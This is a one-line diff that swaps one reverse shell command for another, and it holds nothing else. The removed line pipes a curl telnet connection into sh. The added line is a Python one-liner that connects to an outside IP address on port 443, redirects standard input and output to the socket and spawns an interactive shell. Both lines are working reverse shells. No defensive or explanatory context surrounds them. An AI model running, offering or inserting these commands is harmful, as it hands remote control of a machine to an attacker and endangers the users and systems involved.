@@ -1,1 +1,1 @@
-curl -Ns telnet://143.198.50.168:443; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("143.198.50.168",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
